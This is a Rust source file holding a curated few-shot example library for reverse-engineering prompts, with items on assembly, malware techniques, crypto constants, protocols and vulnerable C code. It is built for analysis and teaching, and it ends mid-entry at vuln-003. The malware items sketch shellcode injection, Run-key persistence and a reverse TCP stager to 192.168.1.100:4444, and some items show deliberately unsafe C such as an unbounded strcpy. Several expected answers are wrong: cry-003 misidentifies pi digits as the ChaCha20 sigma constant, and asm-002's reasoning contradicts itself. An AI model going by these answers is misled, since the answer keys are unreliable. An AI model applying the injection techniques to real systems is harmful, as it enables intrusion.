//! `few_shot_examples` — **Static** few-shot example library for RE prompts.
//!
//! Provides a curated set of 50+ examples across assembly analysis, malware,
//! crypto, protocol, and vulnerability categories, plus selection and formatting
//! utilities.
//!
//! # Distinct from `few_shot_db`
//!
//! `few_shot_examples` is a **static, curated library**: examples are
//! hand-authored at compile time, selected via token-overlap similarity and
//! tag/difficulty filters, and formatted into structured prompt blocks
//! (`Structured`, `QA`, `Plain`, `Xml` styles).  No persistence.
//!
//! `few_shot_db` is a **dynamic, persistent database**: examples are stored in
//! a JSON file (or kept in memory), support cosine-similarity ranking against
//! embedding vectors, quality scores, task tagging, JSONL import/export, and
//! per-database statistics.  Use it when you need to grow the example set at
//! runtime.

use std::collections::HashMap;
use std::fmt;
use std::fmt::Write as _;

use serde::{Deserialize, Serialize};

// ─── Error ───────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ExampleError {
    ExampleNotFound(String),
    CategoryNotFound(String),
    FormatterError(String),
}

impl fmt::Display for ExampleError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ExampleNotFound(id) => write!(f, "example not found: {id}"),
            Self::CategoryNotFound(cat) => write!(f, "category not found: {cat}"),
            Self::FormatterError(msg) => write!(f, "formatter error: {msg}"),
        }
    }
}

impl std::error::Error for ExampleError {}

// ─── ExampleCategory ─────────────────────────────────────────────────────────

/// High-level category for a few-shot example.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ExampleCategory {
    AssemblyAnalysis,
    MalwareAnalysis,
    CryptoIdentification,
    ProtocolReversal,
    VulnerabilityHunting,
    DataStructure,
    ApiUsage,
    Obfuscation,
    Exploitation,
    FirmwareAnalysis,
}

impl fmt::Display for ExampleCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let s = match self {
            Self::AssemblyAnalysis => "assembly_analysis",
            Self::MalwareAnalysis => "malware_analysis",
            Self::CryptoIdentification => "crypto_identification",
            Self::ProtocolReversal => "protocol_reversal",
            Self::VulnerabilityHunting => "vulnerability_hunting",
            Self::DataStructure => "data_structure",
            Self::ApiUsage => "api_usage",
            Self::Obfuscation => "obfuscation",
            Self::Exploitation => "exploitation",
            Self::FirmwareAnalysis => "firmware_analysis",
        };
        write!(f, "{s}")
    }
}

// ─── FewShotExample ──────────────────────────────────────────────────────────

/// A single few-shot example with input, reasoning chain, and expected output.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FewShotExample {
    /// Unique identifier.
    pub id: String,
    /// High-level category.
    pub category: ExampleCategory,
    /// Natural-language or code input (e.g. disassembly snippet).
    pub input: String,
    /// Step-by-step reasoning trace.
    pub reasoning: String,
    /// Expected output / answer.
    pub output: String,
    /// Tags for fine-grained filtering (e.g. "x86-64", "aes", "heap-overflow").
    pub tags: Vec<String>,
    /// Difficulty rating 1–5.
    pub difficulty: u8,
    /// Optional source reference.
    pub source: Option<String>,
}

impl FewShotExample {
    /// Create a new example.
    pub fn new(
        id: impl Into<String>,
        category: ExampleCategory,
        input: impl Into<String>,
        reasoning: impl Into<String>,
        output: impl Into<String>,
    ) -> Self {
        Self {
            id: id.into(),
            category,
            input: input.into(),
            reasoning: reasoning.into(),
            output: output.into(),
            tags: Vec::new(),
            difficulty: 2,
            source: None,
        }
    }

    /// Add a tag.
    pub fn tag(mut self, tag: impl Into<String>) -> Self {
        self.tags.push(tag.into());
        self
    }

    /// Set difficulty.
    #[must_use] 
    pub fn with_difficulty(mut self, d: u8) -> Self {
        self.difficulty = d.clamp(1, 5);
        self
    }

    /// Set source reference.
    pub fn with_source(mut self, source: impl Into<String>) -> Self {
        self.source = Some(source.into());
        self
    }

    /// Simple token-overlap similarity to a query string.
    #[must_use] 
    pub fn similarity_to(&self, query: &str) -> f64 {
        let query_tokens: std::collections::HashSet<&str> = query.split_whitespace().collect();
        let self_tokens: std::collections::HashSet<&str> = self
            .input
            .split_whitespace()
            .chain(self.tags.iter().map(std::string::String::as_str))
            .collect();
        if query_tokens.is_empty() || self_tokens.is_empty() {
            return 0.0;
        }
        let intersection = query_tokens.intersection(&self_tokens).count();
        let union = query_tokens.union(&self_tokens).count();
        intersection as f64 / union as f64
    }
}

// ─── ExampleLibrary ──────────────────────────────────────────────────────────

/// A searchable library of few-shot examples.
#[derive(Debug, Default)]
pub struct ExampleLibrary {
    examples: HashMap<String, FewShotExample>,
}

impl ExampleLibrary {
    /// Create an empty library.
    #[must_use] 
    pub fn new() -> Self {
        Self::default()
    }

    /// Create a library pre-populated with 50+ built-in examples.
    #[must_use] 
    pub fn with_defaults() -> Self {
        let mut lib = Self::new();
        lib.populate_assembly_examples();
        lib.populate_malware_examples();
        lib.populate_crypto_examples();
        lib.populate_protocol_examples();
        lib.populate_vulnerability_examples();
        lib
    }

    /// Add a single example.
    pub fn add(&mut self, example: FewShotExample) {
        self.examples.insert(example.id.clone(), example);
    }

    /// Look up by ID.
    #[must_use] 
    pub fn get(&self, id: &str) -> Option<&FewShotExample> {
        self.examples.get(id)
    }

    /// Total number of examples.
    #[must_use] 
    pub fn len(&self) -> usize {
        self.examples.len()
    }

    /// True if empty.
    #[must_use] 
    pub fn is_empty(&self) -> bool {
        self.examples.is_empty()
    }

    /// Return all examples in a category.
    #[must_use] 
    pub fn by_category(&self, cat: ExampleCategory) -> Vec<&FewShotExample> {
        self.examples
            .values()
            .filter(|e| e.category == cat)
            .collect()
    }

    /// Return all examples with a given tag.
    #[must_use] 
    pub fn by_tag(&self, tag: &str) -> Vec<&FewShotExample> {
        self.examples
            .values()
            .filter(|e| e.tags.iter().any(|t| t == tag))
            .collect()
    }

    /// Return all examples up to and including the given difficulty.
    #[must_use] 
    pub fn by_max_difficulty(&self, max: u8) -> Vec<&FewShotExample> {
        self.examples
            .values()
            .filter(|e| e.difficulty <= max)
            .collect()
    }

    // ─── Populate helpers ────────────────────────────────────────────────────

    fn populate_assembly_examples(&mut self) {
        let examples = vec![
            FewShotExample::new(
                "asm-001",
                ExampleCategory::AssemblyAnalysis,
                "MOV EAX, [EBP+8]\nADD EAX, 1\nMOV [EBP+8], EAX\nRET",
                "1. Load argument from stack (EBP+8 is first arg in cdecl).\n2. Increment by 1.\n3. Store result back.\n4. Return — no return value in EAX, so this mutates the argument in-place through the pointer.",
                "Function increments the integer at the pointer passed as its first argument.",
            ).tag("x86").tag("cdecl").with_difficulty(1),

            FewShotExample::new(
                "asm-002",
                ExampleCategory::AssemblyAnalysis,
                "PUSH RBX\nMOV RBX, RDI\nCALL malloc\nMOV [RBX], RAX\nPOP RBX\nRET",
                "1. Save callee-saved RBX (System V AMD64 ABI).\n2. Move first argument (RDI) to RBX for safekeeping across the malloc call.\n3. Allocate memory — size still in RDI unchanged? Actually size passed via RDI before PUSH would be overwritten; here RDI is the output pointer-pointer, not size. Need more context. Most likely the caller set RSI=size, and the function passes it through.\n4. Store malloc result into memory pointed to by RBX (first arg).\n5. Return.",
                "Function allocates memory and stores the result pointer into *arg0.",
            ).tag("x86-64").tag("sysv-amd64").tag("heap").with_difficulty(2),

            FewShotExample::new(
                "asm-003",
                ExampleCategory::AssemblyAnalysis,
                "XOR EAX, EAX\n.loop:\nMOVZX ECX, BYTE PTR [RDI+RAX]\nTEST ECX, ECX\nJZ .done\nINC RAX\nJMP .loop\n.done:\nRET",
                "1. Clear EAX (counter = 0).\n2. Load byte at RDI+RAX (iterating over string pointed to by RDI).\n3. Test for null terminator.\n4. If null, exit loop.\n5. Otherwise increment counter and loop.\n6. Return with count in EAX/RAX.",
                "strlen implementation — returns length of null-terminated string in RDI.",
            ).tag("x86-64").tag("string").tag("loop").with_difficulty(1),

            FewShotExample::new(
                "asm-004",
                ExampleCategory::AssemblyAnalysis,
                "PUSH EBP\nMOV EBP, ESP\nSUB ESP, 0x10\nMOV DWORD PTR [EBP-4], 0\n.loop:\nCMP DWORD PTR [EBP-4], 10\nJGE .done\nMOV EAX, [EBP-4]\nINC EAX\nMOV [EBP-4], EAX\nJMP .loop\n.done:\nLEAVE\nRET",
                "1. Function prologue: save EBP, set up stack frame, allocate 16 bytes.\n2. Initialize local variable at EBP-4 to 0.\n3. Compare local variable to 10; if >=, exit.\n4. Increment local variable.\n5. Repeat until local == 10.\n6. Return.",
                "A simple for-loop counting from 0 to 9. The function has no observable effect (result discarded).",
            ).tag("x86").tag("loop").tag("stack-frame").with_difficulty(1),

            FewShotExample::new(
                "asm-005",
                ExampleCategory::AssemblyAnalysis,
                "MOV EAX, [EDX]\nMOV ECX, [EDX+4]\nCMP EAX, ECX\nJLE .already_sorted\nMOV [EDX], ECX\nMOV [EDX+4], EAX\n.already_sorted:\nRET",
                "1. Load first element of a two-element array into EAX.\n2. Load second element into ECX.\n3. Compare; if EAX <= ECX, already in order.\n4. Otherwise swap the two elements in memory.",
                "Sorts a two-element integer array pointed to by EDX in ascending order.",
            ).tag("x86").tag("sort").tag("branch").with_difficulty(2),

            FewShotExample::new(
                "asm-006",
                ExampleCategory::AssemblyAnalysis,
                "SHR EAX, 1\nJNC .no_remainder\nOR EAX, 0x80000000\n.no_remainder:\nRET",
                "1. Right-shift EAX by 1, carry flag gets bit 0.\n2. If carry clear (original bit 0 was 0), skip.\n3. Otherwise set MSB (rotate semantics).",
                "Right-rotate of EAX by 1 bit (ROR EAX, 1 equivalent).",
            ).tag("x86").tag("bit-manipulation").with_difficulty(2),

            FewShotExample::new(
                "asm-007",
                ExampleCategory::AssemblyAnalysis,
                "TEST EDI, EDI\nJZ .ret_null\nCMP ESI, 0\nJLE .ret_null\nMOV EAX, 1\nRET\n.ret_null:\nXOR EAX, EAX\nRET",
                "1. Test if pointer (EDI) is null.\n2. Test if count (ESI) is non-positive.\n3. Return 1 if both valid, else 0.",
                "Validates: returns 1 if pointer is non-null and count > 0, else 0.",
            ).tag("x86-64").tag("validation").with_difficulty(1),

            FewShotExample::new(
                "asm-008",
                ExampleCategory::AssemblyAnalysis,
                "IMUL EAX, EAX, 0x66666667\nSAR EDX, 1\nMOV ECX, EAX\nSHR ECX, 31\nADD EDX, ECX",
                "1. Multiply EAX by the magic number 0x66666667.\n2. Arithmetic-shift-right result (in EDX:EAX) by 1.\n3. Extract sign bit of original product.\n4. Add sign correction to quotient.\nThis is the compiler-generated integer division optimisation for dividing by 10.",
                "Optimised division by 10 using multiplicative inverse. Equivalent to: result = EAX / 10.",
            ).tag("x86").tag("division-optimization").tag("compiler-idiom").with_difficulty(4),

            FewShotExample::new(
                "asm-009",
                ExampleCategory::AssemblyAnalysis,
                "MOVDQU XMM0, [RDI]\nPCMPEQB XMM0, XMM1\nPMOVMSKB EAX, XMM0\nTEST EAX, EAX\nSETNZ AL",
                "1. Load 16 bytes from RDI into XMM0.\n2. Compare each byte with XMM1 (which must contain a search byte replicated 16 times).\n3. Extract comparison result bitmask.\n4. Return non-zero if any byte matched.",
                "SIMD byte-search: checks whether any of the 16 bytes at [RDI] equals the byte broadcast into XMM1.",
            ).tag("x86-64").tag("sse2").tag("simd").with_difficulty(3),

            FewShotExample::new(
                "asm-010",
                ExampleCategory::AssemblyAnalysis,
                "PUSH R15\nPUSH R14\nPUSH R13\nMOV R15, RDI\nMOV R14, RSI\nMOV R13, RDX\n... (function body) ...\nPOP R13\nPOP R14\nPOP R15\nRET",
                "R15, R14, R13 are callee-saved registers in the System V AMD64 ABI.\nThe function saves them, uses them to hold its first three arguments across calls, then restores them.",
                "Function prologue saving three callee-saved registers to preserve arguments across internal calls.",
            ).tag("x86-64").tag("abi").tag("callee-saved").with_difficulty(2),
        ];
        for e in examples {
            self.add(e);
        }
    }

    fn populate_malware_examples(&mut self) {
        let examples = vec![
            FewShotExample::new(
                "mal-001",
                ExampleCategory::MalwareAnalysis,
                "CreateMutexA(NULL, TRUE, \"Global\\\\MutexXYZ123\")\nif GetLastError() == ERROR_ALREADY_EXISTS: ExitProcess(0)",
                "1. CreateMutex with a hardcoded name creates or opens a named mutex.\n2. Checking ERROR_ALREADY_EXISTS detects if another instance is running.\n3. Exiting if it exists is the classic single-instance check for malware.",
                "Single-instance mutex check — ensures only one copy of the malware runs at a time.",
            ).tag("windows").tag("mutex").tag("anti-analysis").with_difficulty(2),

            FewShotExample::new(
                "mal-002",
                ExampleCategory::MalwareAnalysis,
                "RegSetValueExA(HKEY_CURRENT_USER, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", 0, \"Updater\", REG_SZ, path, len)",
                "1. Opening HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.\n2. Setting a REG_SZ value called 'Updater' pointing to the malware path.\n3. This registry key is executed at user logon by Windows.",
                "Registry-based persistence — adds the malware executable to the Run key so it starts at login.",
            ).tag("windows").tag("persistence").tag("registry").with_difficulty(2),

            FewShotExample::new(
                "mal-003",
                ExampleCategory::MalwareAnalysis,
                "VirtualAlloc(NULL, shellcode_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)\nmemcpy(allocated_mem, shellcode, shellcode_size)\nCreateThread(NULL, 0, allocated_mem, NULL, 0, NULL)",
                "1. Allocate RWX memory — executable, writable, committed.\n2. Copy shellcode bytes into the allocation.\n3. Create a thread starting at the shellcode.",
                "Classic shellcode injection / execution via VirtualAlloc+memcpy+CreateThread. Strongly indicative of malicious activity.",
            ).tag("windows").tag("shellcode").tag("injection").with_difficulty(3),

            FewShotExample::new(
                "mal-004",
                ExampleCategory::MalwareAnalysis,
                "RDTSC\nMOV EBX, EAX\nCPUID\nRDTSC\nSUB EAX, EBX\nCMP EAX, 0x100\nJA detected_debugger",
                "1. RDTSC reads timestamp counter before CPUID (serializing instruction).\n2. CPUID flushes the pipeline, acts as a timing barrier.\n3. Second RDTSC after.\n4. Delta > 0x100 (256 cycles) suggests a debugger is single-stepping.",
                "RDTSC timing anti-debug check — detects single-stepping by measuring instruction timing.",
            ).tag("anti-debug").tag("timing").tag("x86").with_difficulty(3),

            FewShotExample::new(
                "mal-005",
                ExampleCategory::MalwareAnalysis,
                "CALL GetProcAddress\nMOV EAX, [EBP-4]\nXOR EAX, EAX\nPUSH EAX\nCALL ExitProcess",
                "After GetProcAddress returns, the address is zeroed out rather than called — this is likely obfuscated control flow or a stub that has been patched. ExitProcess is called immediately after.",
                "Suspicious GetProcAddress usage followed by immediate exit — possible anti-analysis stub or broken shellcode.",
            ).tag("windows").tag("anti-analysis").tag("obfuscation").with_difficulty(3),

            FewShotExample::new(
                "mal-006",
                ExampleCategory::MalwareAnalysis,
                "NtQuerySystemInformation(SystemKernelDebuggerInformation, &info, sizeof(info), NULL)\nif info.KernelDebuggerEnabled != 0: goto detected",
                "1. NtQuerySystemInformation with class 0x23 (SystemKernelDebuggerInformation).\n2. Checks KernelDebuggerEnabled field.\n3. If set, a kernel debugger (WinDbg, KD) is attached — triggers evasion.",
                "Kernel debugger detection via NtQuerySystemInformation — evades kernel-mode debugging.",
            ).tag("windows").tag("anti-debug").tag("nt-api").with_difficulty(3),

            FewShotExample::new(
                "mal-007",
                ExampleCategory::MalwareAnalysis,
                "GetModuleHandleA(NULL) → base\nparse PE headers at base\nwalk export table of ntdll.dll\nresolve NtCreateFile manually",
                "1. GetModuleHandleA(NULL) gives the process base.\n2. Walking the in-memory PE export table instead of calling GetProcAddress.\n3. This avoids GetProcAddress hooks placed by AV/EDR.",
                "Manual DLL export resolution (reflective/manual API hashing) to bypass IAT hooks.",
            ).tag("windows").tag("evasion").tag("api-hashing").with_difficulty(4),

            FewShotExample::new(
                "mal-008",
                ExampleCategory::MalwareAnalysis,
                "OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)\nVirtualAllocEx(handle, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\nWriteProcessMemory(handle, remote_addr, shellcode, size, NULL)\nCreateRemoteThread(handle, NULL, 0, remote_addr, NULL, 0, NULL)",
                "1. Open a handle to a target process.\n2. Allocate RWX memory in the target process.\n3. Write shellcode into that allocation.\n4. Create a thread in the target process starting at the injected code.",
                "Classic remote process injection (CreateRemoteThread technique).",
            ).tag("windows").tag("injection").tag("process-injection").with_difficulty(3),

            FewShotExample::new(
                "mal-009",
                ExampleCategory::MalwareAnalysis,
                "for byte in data:\n    result.append(byte XOR key[i % len(key)])",
                "Simple XOR cipher iterating over a key. Not cryptographically secure but frequently used in malware C2 traffic obfuscation.",
                "XOR stream cipher with repeating key — common malware C2 traffic obfuscation.",
            ).tag("xor").tag("c2").tag("obfuscation").with_difficulty(1),

            FewShotExample::new(
                "mal-010",
                ExampleCategory::MalwareAnalysis,
                "WSAStartup(...)\nsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\nconnect(sock, {192.168.1.100, 4444})\nrecv(sock, buf, 4096, 0)\n[execute received bytes as shellcode]",
                "1. Initialize Winsock.\n2. Create TCP socket.\n3. Connect to hardcoded C2 at 192.168.1.100:4444.\n4. Receive shellcode.\n5. Execute received bytes — classic reverse shell/stager.",
                "Reverse TCP stager — connects to C2, downloads and executes stage-2 shellcode.",
            ).tag("windows").tag("c2").tag("reverse-shell").with_difficulty(2),
        ];
        for e in examples {
            self.add(e);
        }
    }

    fn populate_crypto_examples(&mut self) {
        let examples = vec![
            FewShotExample::new(
                "cry-001",
                ExampleCategory::CryptoIdentification,
                "0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476",
                "These four 32-bit constants are the initial hash values (IV) for MD5 and SHA-1 (SHA-1 has a 5th constant 0xC3D2E1F0). Their presence in initialisation code strongly indicates MD5 or SHA-1 hashing.",
                "MD5 or SHA-1 initialisation constants — indicates use of MD5 or SHA-1.",
            ).tag("md5").tag("sha1").tag("constants").with_difficulty(1),

            FewShotExample::new(
                "cry-002",
                ExampleCategory::CryptoIdentification,
                "0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A, 0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19",
                "These eight 32-bit constants are the fractional parts of the square roots of the first 8 primes — the initialisation vector for SHA-256.",
                "SHA-256 initialisation vector constants.",
            ).tag("sha256").tag("constants").with_difficulty(2),

            FewShotExample::new(
                "cry-003",
                ExampleCategory::CryptoIdentification,
                "0x243F6A88, 0x85A308D3, 0x13198A2E, 0x03707344",
                "These are the first four 32-bit words of pi in hexadecimal — the magic constant 'expand 32-byte k' encoded as four 32-bit words. Used as the SIGMA constant in ChaCha20/Salsa20.",
                "ChaCha20/Salsa20 sigma constant derived from pi digits.",
            ).tag("chacha20").tag("salsa20").tag("constants").with_difficulty(3),

            FewShotExample::new(
                "cry-004",
                ExampleCategory::CryptoIdentification,
                "// S-box lookup table, 256 entries\nbytes = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, ...]",
                "1. The first byte is 0x63, which is the AES S-box substitution of 0x00.\n2. 256-entry lookup table in read-only data section.\n3. Cross-reference with known AES S-box confirms this is AES SubBytes.",
                "AES S-box lookup table — this code implements AES SubBytes.",
            ).tag("aes").tag("sbox").tag("constants").with_difficulty(2),

            FewShotExample::new(
                "cry-005",
                ExampleCategory::CryptoIdentification,
                "MOVDQU XMM0, [key]\nAESENC XMM0, [round_keys+16]\nAESENC XMM0, [round_keys+32]\n... (9 more AESENC)\nAESENCLAST XMM0, [round_keys+160]",
                "1. AES-NI instruction AESENC performs one AES round (ShiftRows + SubBytes + MixColumns + AddRoundKey).\n2. AESENCLAST is the final round (no MixColumns).\n3. 10 AESENC + 1 AESENCLAST = 11 rounds total = AES-128.",
                "AES-128 encryption using Intel AES-NI hardware instructions.",
            ).tag("aes").tag("aes-ni").tag("hardware-crypto").with_difficulty(3),

            FewShotExample::new(
                "cry-006",
                ExampleCategory::CryptoIdentification,
                "MOV EAX, state[0]\nROL EAX, 30\nXOR EAX, EBX\nROL EAX, 1\nADD EAX, 0x5A827999",
                "1. Rotate-left-30 is characteristic of SHA-1's Sha1RotateLeft.\n2. XOR followed by ROL 1 matches SHA-1's f1 function applied to register mix.\n3. 0x5A827999 is floor(2^30 * sqrt(2)) — SHA-1 round constant for rounds 0–19.",
                "SHA-1 round function — rounds 0–19 with Kt = 0x5A827999.",
            ).tag("sha1").tag("round-function").with_difficulty(3),

            FewShotExample::new(
                "cry-007",
                ExampleCategory::CryptoIdentification,
                "// Key schedule producing 11 * 16 = 176 bytes from 16-byte input key\nfor i in range(4, 44):\n    temp = W[i-1]\n    if i % 4 == 0:\n        temp = SubWord(RotWord(temp)) XOR Rcon[i/4]\n    W[i] = W[i-4] XOR temp",
                "1. Word-based key expansion — each word depends on prior word and (every 4th iteration) SubWord+RotWord+Rcon.\n2. 44 words × 4 bytes = 176 bytes total for 11 round keys.\n3. Rcon constants from GF(2^8).\nThis is the AES-128 KeyExpansion algorithm.",
                "AES-128 key schedule (KeyExpansion) — generates 11 round keys from a 128-bit master key.",
            ).tag("aes").tag("key-schedule").with_difficulty(3),

            FewShotExample::new(
                "cry-008",
                ExampleCategory::CryptoIdentification,
                "IMUL state, 0x41C64E6D\nADD state, 0x3039\nAND eax, 0x7FFFFFFF",
                "1. Multiply by 0x41C64E6D (LCG multiplier from glibc/Java stdlib).\n2. Add 0x3039 (LCG increment, decimal 12345).\n3. Mask to 31 bits.\nThis is a Linear Congruential Generator — NOT cryptographically secure.",
                "Linear Congruential Generator (LCG) — rand() / java.util.Random PRNG, NOT cryptographically secure.",
            ).tag("prng").tag("lcg").tag("weak-crypto").with_difficulty(2),

            FewShotExample::new(
                "cry-009",
                ExampleCategory::CryptoIdentification,
                "// 256-entry table: crc_table[i] for i in 0..255\n// Generated by: if (c & 1) c = 0xEDB88320 ^ (c >> 1)",
                "1. 0xEDB88320 is the bit-reversed polynomial for CRC-32 (IEEE 802.3).\n2. The reflected computation (LSB-first) is standard zlib/gzip CRC-32.",
                "CRC-32 (IEEE 802.3) lookup table generation with reflected polynomial 0xEDB88320.",
            ).tag("crc32").tag("checksum").tag("constants").with_difficulty(2),

            FewShotExample::new(
                "cry-010",
                ExampleCategory::CryptoIdentification,
                "0x9e3779b9  // or 0x9e3779b97f4a7c15 for 64-bit",
                "0x9E3779B9 = floor(2^32 / phi) where phi is the golden ratio (1.618...). This constant appears in TEA, XTEA, XXTEA, and various hash mixing functions as a diffusion constant.",
                "TEA/XTEA golden ratio constant (delta = 0x9E3779B9) — used in XTEA/TEA cipher key mixing.",
            ).tag("tea").tag("xtea").tag("constants").with_difficulty(2),

            FewShotExample::new(
                "cry-011",
                ExampleCategory::CryptoIdentification,
                "MULX RDX, RAX, [RBX]\nADCX RAX, RCX\nADOX RDX, R8",
                "MULX, ADCX, ADOX are BMI2/ADX instructions enabling multi-precision multiplication without carry-chain bottlenecks. This pattern is typical of big-integer arithmetic for RSA/ECC modular multiplication.",
                "Multi-precision integer multiplication using BMI2/ADX — likely RSA or elliptic-curve modular arithmetic.",
            ).tag("rsa").tag("ecc").tag("bmi2").tag("adx").with_difficulty(4),

            FewShotExample::new(
                "cry-012",
                ExampleCategory::CryptoIdentification,
                "// RC4 KSA\nfor i in 0..256: S[i] = i\nj = 0\nfor i in 0..256:\n    j = (j + S[i] + key[i % keylen]) % 256\n    swap(S[i], S[j])",
                "1. S-box initialisation with 0..255 identity.\n2. Key-scheduling algorithm (KSA) mixes key bytes into S-box.\n3. Characteristic two nested for-loops with a swap.\nThis is the RC4 Key Scheduling Algorithm.",
                "RC4 Key Scheduling Algorithm (KSA) — initialises the S-box with the key.",
            ).tag("rc4").tag("stream-cipher").with_difficulty(2),
        ];
        for e in examples {
            self.add(e);
        }
    }

    fn populate_protocol_examples(&mut self) {
        let examples = vec![
            FewShotExample::new(
                "proto-001",
                ExampleCategory::ProtocolReversal,
                "bytes: 0x00 0x00 0x00 0x12 0x01 0x00 'H' 'e' 'l' 'l' 'o'",
                "1. First 4 bytes (0x00000012 = 18) look like a big-endian length prefix covering the rest of the message (14 bytes? No — let's count: 18 bytes total, 4 byte header = 14 byte payload including type byte).\n2. Byte 4 (0x01) is likely a message type or version.\n3. Byte 5 (0x00) is likely flags or sequence.\n4. Remaining bytes are 'Hello' — printable ASCII payload.",
                "TLV-style binary protocol: [uint32_be length][uint8 type][uint8 flags][payload]",
            ).tag("binary-protocol").tag("tlv").with_difficulty(2),

            FewShotExample::new(
                "proto-002",
                ExampleCategory::ProtocolReversal,
                "GET /api/v2/users HTTP/1.1\nHost: 192.168.1.50\nX-Token: 4a3f9c2e\nContent-Length: 0",
                "1. Standard HTTP/1.1 GET.\n2. Custom header X-Token suggests API token authentication.\n3. /api/v2/users is a REST endpoint — likely returns user list.\n4. Host is a local IP — suggests internal/private API.",
                "REST API call with token auth to internal service, GET /api/v2/users.",
            ).tag("http").tag("rest").tag("api").with_difficulty(1),

            FewShotExample::new(
                "proto-003",
                ExampleCategory::ProtocolReversal,
                "// Server sends: [4-byte magic 0xDEADBEEF][2-byte version][2-byte payload_len][payload_len bytes]\n// Client responds: [4-byte magic 0xBEEFDEAD][2-byte version][2-byte status][status_message]",
                "1. Symmetric magic numbers (swapped) identify direction.\n2. Version field allows protocol evolution.\n3. Length-prefixed payloads avoid fragmentation ambiguity.\n4. Status field in response mirrors HTTP status semantics.",
                "Custom binary request-response protocol with magic-number framing and explicit length.",
            ).tag("binary-protocol").tag("custom").with_difficulty(2),

            FewShotExample::new(
                "proto-004",
                ExampleCategory::ProtocolReversal,
                "// Observed: client connects, sends 16-byte nonce, server responds with 16-byte nonce, then both derive session key: HKDF(client_nonce||server_nonce, master_key, 'session')",
                "1. Challenge-response nonce exchange to provide freshness.\n2. Concatenating both nonces prevents replay attacks.\n3. HKDF key derivation produces a session key unique to this connection.",
                "Authenticated key agreement: nonce exchange + HKDF session key derivation — prevents replay attacks.",
            ).tag("crypto").tag("key-exchange").tag("hkdf").with_difficulty(3),

            FewShotExample::new(
                "proto-005",
                ExampleCategory::ProtocolReversal,
                "MQTT CONNECT packet:\n  byte  0: 0x10 (CONNECT control type 1, flags 0)\n  byte  1: 0x22 (remaining length = 34)\n  bytes 2-3: 0x00 0x04 (protocol name length = 4)\n  bytes 4-7: 'MQTT'\n  byte  8: 0x04 (protocol level = MQTT 3.1.1)\n  byte  9: 0xC2 (connect flags: clean session, username, password)\n",
                "1. Fixed header byte 0x10 = CONNECT.\n2. Remaining length 0x22=34 bytes.\n3. Protocol name 'MQTT' confirms MQTT v3.1.1.\n4. Connect flags 0xC2 = 11000010b: username=1, password=1, clean_session=1.",
                "MQTT 3.1.1 CONNECT packet with clean session and username/password authentication.",
            ).tag("mqtt").tag("iot").tag("protocol").with_difficulty(3),

            FewShotExample::new(
                "proto-006",
                ExampleCategory::ProtocolReversal,
                "// All messages start with varint-encoded message type, then varint payload length\ntype=1 (PING): no payload\ntype=2 (PONG): no payload\ntype=3 (DATA): [varint length][bytes]\ntype=4 (AUTH): [uint32 token]",
                "1. Varint encoding saves space for small values.\n2. Type/length prefix is a minimal TLV scheme.\n3. AUTH uses a fixed 32-bit token — weak authentication.\n4. PING/PONG used for keepalive.",
                "Lightweight varint-framed binary protocol with keepalive and token auth.",
            ).tag("varint").tag("binary-protocol").tag("keepalive").with_difficulty(2),

            FewShotExample::new(
                "proto-007",
                ExampleCategory::ProtocolReversal,
                "// Protobuf-like: field_number << 3 | wire_type, then value\n// Wire type 0 = varint, 2 = length-delimited\nfield 1 (varint): 42\nfield 2 (length-delimited, 5 bytes): 'hello'",
                "1. Encoding matches Protocol Buffers field encoding (tag = field_number * 8 + wire_type).\n2. Wire type 0 = varint (zigzag or raw), wire type 2 = length-delimited (string/bytes/nested).\n3. This could be actual protobuf or a hand-rolled protocol that borrows its encoding.",
                "Protocol Buffers (protobuf) or compatible encoding: field-tag + varint or length-delimited values.",
            ).tag("protobuf").tag("binary-protocol").with_difficulty(3),

            FewShotExample::new(
                "proto-008",
                ExampleCategory::ProtocolReversal,
                "// Diffie-Hellman group exchange observed:\n// Client: SSH2_MSG_KEX_DH_GEX_REQUEST (min=1024, pref=2048, max=8192)\n// Server: SSH2_MSG_KEX_DH_GEX_GROUP (p, g)\n// Client: SSH2_MSG_KEX_DH_GEX_INIT (e = g^x mod p)",
                "1. DH group exchange negotiates the prime p and generator g dynamically.\n2. Minimum group size 1024, preferred 2048 — avoids Logjam attack.\n3. e = g^x mod p is the client's public key; x is secret random.",
                "SSH2 Diffie-Hellman group exchange key agreement — negotiated group for forward secrecy.",
            ).tag("ssh").tag("diffie-hellman").tag("key-exchange").with_difficulty(4),
        ];
        for e in examples {
            self.add(e);
        }
    }

    fn populate_vulnerability_examples(&mut self) {
        let examples = vec![
            FewShotExample::new(
                "vuln-001",
                ExampleCategory::VulnerabilityHunting,
                "void copy_input(char *dst, const char *src) {\n    strcpy(dst, src);\n}",
                "1. strcpy copies until null terminator with no length check.\n2. If src is longer than dst's allocation, adjacent stack/heap memory is overwritten.\n3. This is a classic stack-based buffer overflow.",
                "Stack-based buffer overflow via unbounded strcpy — attacker controls src length.",
            ).tag("buffer-overflow").tag("stack").tag("strcpy").with_difficulty(1),

            FewShotExample::new(
                "vuln-002",
                ExampleCategory::VulnerabilityHunting,
                "int total = count * sizeof(struct item);\nchar *buf = malloc(total);\nmemcpy(buf, src, total);",
                "1. `count * sizeof(struct item)` can overflow if count is large (e.g. count = 0xFFFFFFFF).\n2. Overflow causes total to wrap to a small value.\n3. malloc allocates small buffer but memcpy copies much more, causing heap overflow.",
                "Integer overflow in size calculation leading to heap buffer overflow.",
            ).tag("integer-overflow").tag("heap").tag("multiplication").with_difficulty(3),

            FewShotExample::new(
                "vuln-003",
                ExampleCategory::VulnerabilityHunting,
